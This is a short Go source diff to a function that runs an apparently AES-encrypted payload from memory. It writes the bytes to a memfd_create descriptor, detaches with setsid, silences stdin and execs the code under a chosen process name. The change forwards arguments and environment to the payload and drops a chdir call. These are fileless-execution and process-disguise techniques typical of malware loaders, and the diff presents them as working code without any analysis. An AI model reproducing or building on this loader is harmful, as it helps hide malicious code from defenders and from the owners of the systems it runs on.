@@ -19,6 +19,7 @@ const (
 
 func runFromMemory(procName string, buffer []byte) {
 	fdName := "" // *string cannot be initialized
+	env := os.Environ()
 
 	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
 	_, _ = syscall.Write(int(fd), buffer)
@@ -38,13 +39,13 @@ func runFromMemory(procName string, buffer []byte) {
 
 	_ = syscall.Umask(0)
 	_, _ = syscall.Setsid()
-	_ = syscall.Chdir("/")
 
 	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
 	syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
 	file.Close()
 
-	_ = syscall.Exec(fdPath, []string{procName}, nil)
+	args := append([]string{procName}, os.Args[1:]...)
+	_ = syscall.Exec(fdPath, args, env)
 }
 
 func aesDec(srcBytes, key, iv []byte) []byte {
